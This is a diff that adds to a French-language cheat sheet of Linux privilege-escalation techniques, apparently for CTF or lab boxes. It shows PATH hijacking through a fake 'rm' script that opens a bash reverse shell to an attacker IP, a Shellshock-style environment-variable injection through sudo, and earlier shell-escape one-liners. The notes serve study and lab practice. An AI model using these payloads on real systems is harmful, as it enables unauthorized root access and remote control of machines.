@@ -37,3 +37,20 @@ SHELL=/bin/bash exec /bin/bash
 # Using shell functions
 function() { /bin/bash; }; function
 ```
+
+# Techniques d'élévation de privilèges Linux dans des Box
+### Exploitation du PATH
+Exemple (Shiftdel):
+```bash
+# Exploiter un script qui utilise des commandes sans chemin absolu
+echo '#!/bin/bash' > ~/bin/rm
+echo 'bash -i >& /dev/tcp/192.168.49.x/1234 0>&1' >> ~/bin/rm
+chmod +x ~/bin/rm
+# Attendre que le script s'exécute avec des privilèges élevés
+```
+### Variables d'environnement vulnérables
+Exemple (Jordak):
+```bash
+# Exploiter des variables d'environnement non sécurisées
+sudo -u root env 'VAR=() { :;}; /bin/bash' /usr/bin/sudo
+```
